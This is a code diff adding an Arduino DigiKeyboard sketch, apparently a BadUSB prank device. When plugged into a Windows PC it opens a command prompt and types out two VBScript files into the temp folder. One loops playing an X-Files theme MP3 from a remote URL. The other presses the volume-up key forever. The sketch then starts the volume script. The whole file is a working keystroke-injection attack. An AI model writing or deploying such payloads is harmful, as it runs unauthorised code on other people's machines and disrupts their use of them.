@@ -1,0 +1,62 @@
+
+#include "DigiKeyboard.h"
+
+void setup() {
+   //clear
+  //DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(0);
+
+  // press and release windows key
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  // open cmd
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.delay(500);
+  
+  // remove files that may exist with same name
+  //DigiKeyboard.println("del %tmp%\\song.vbs");
+  //DigiKeyboard.println("del %tmp%\\volup.vbs");
+  DigiKeyboard.println("cd %tmp% && copy con song.vbs");
+  DigiKeyboard.println("While true");
+  DigiKeyboard.println("Dim oPlayer");
+  DigiKeyboard.println("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");
+  DigiKeyboard.println("oPlayer.URL = \"http://www.arilou.org/songs/r/X-Files%20Theme.mp3\"");
+  DigiKeyboard.println("oPlayer.controls.play");
+  DigiKeyboard.println("While oPlayer.playState <> 1 ' 1 = Stopped");
+  DigiKeyboard.println("WScript.Sleep 100");
+  DigiKeyboard.println("Wend");
+  DigiKeyboard.println("oPlayer.close");
+  DigiKeyboard.println("Wend");
+  DigiKeyboard.sendKeyStroke(0);
+  // control C to finish creating the file
+  DigiKeyboard.sendKeyStroke(6, MOD_CONTROL_RIGHT);
+  //DigiKeyboard.sendKeyPress('Z');
+  //DigiKeyboard.sendKeyStroke('0');
+  //DigiKeyboard.delay(500);
+  //DigiKeyboard.sendKeyStroke(40);
+  
+  //DigiKeyboard.delay(500);
+  DigiKeyboard.println("copy con volup.vbs");
+  DigiKeyboard.println("do");
+  DigiKeyboard.println("Set WshShell = CreateObject(\"WScript.Shell\")");
+  DigiKeyboard.println("WshShell.SendKeys(chr(175))");
+  DigiKeyboard.println("loop");
+  DigiKeyboard.sendKeyStroke(6, MOD_CONTROL_LEFT);
+  //DigiKeyboard.sendKeyStroke(40);
+  //DigiKeyboard.println("start song.vbs && volup.vbs");
+  
+  //DigiKeyboard.println("start song.vbs && volup.vbs");
+  DigiKeyboard.println("start volup.vbs");
+  //DigiKeyboard.println("start song.vbs");
+  //DigiKeyboard.println("exit");
+  //DigiKeyboard.sendKeyStroke(40);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+  //DigiKeyboard.println("start song.vbs && volup.vbs");
+  
+
+}
